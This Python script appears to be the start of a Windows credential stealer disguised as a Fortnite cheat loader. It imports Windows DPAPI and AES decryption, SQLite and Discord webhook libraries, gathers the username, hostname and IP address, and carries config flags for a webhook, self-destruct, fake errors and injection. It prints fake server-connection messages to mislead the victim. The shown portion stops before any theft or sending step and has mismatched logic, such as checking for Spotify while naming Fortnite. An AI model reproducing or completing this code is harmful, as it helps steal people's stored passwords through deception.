import dhooks
from dhooks import Webhook, Embed
import os
import socket
import datetime
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import requests
import discord
import subprocess
import time
import psutil
import random

#ENSURE MODULES ARE INSTALLED
def install_modules():
    modules_to_import = ["random", "dhooks", "Webhook", "Embed", "os", "socket", "datetime", "re", "sys", "json", "base64", "sqlite3" ,"win32crypt", "cryptodome", "AES", "shutil", "csv", "requests", "discord", "subprocess", "time", "psutil"]

    for module_name in modules_to_import:
        try:
            # Run a Python script that imports the current module
            subprocess.run(['python', '-c', f'import {module_name}'], check=True)
        except subprocess.CalledProcessError as e:
            pass
        except ModuleNotFoundError as e:
            print("Unable to connect to server. ")
        except Exception as e:
            pass

#MAIN VARIABLES
user_pc_username = os.environ['USERNAME']
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
time_now = datetime.datetime.now()

#FILE PATHS
temp_file_path = (f"C:\\temp")
temp_path = os.path.join(temp_file_path, "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=20)))

localappdata = os.getenv("localappdata")

__CONFIG__ = {
    "service_online": True,

    "webhook": "",
    "ping": False,
    "systeminfo": True,


    "selfdestruct": False,
    "fakeerror": False,
    "injection": False


}

def error_message():
    print("[-] Unable to connect to server. If this issue re-occurs, contact support.")


def automatic_checks():
    def start_check():
        if __CONFIG__["service_online"]:
            print("[+] Service is ONLINE. Connecting to server...")
            time.sleep(random.randint(1,6))
            os.system("CLS")
        else:
            print("[-] Service is currently OFFLINE. Check discord for updates.")
            a = input("")


    def create_path():
        if temp_file_path:
            os.mkdir(temp_path)
        else:
            error_message()

    def check_if_noottrof_on():
        for process in psutil.process_iter(['pid', 'name']):
            if process.info['name'] == 'Spotify.exe':
                return True
        return False
    
    start_check()
    create_path()



    check_if_noottrof_on()
    if check_if_noottrof_on():
        print("[-] Ensure F0RTN1T3 is fully closed before opening the loader.")
        a = input("")
        exit()
    else:
        pass
    
    
automatic_checks()


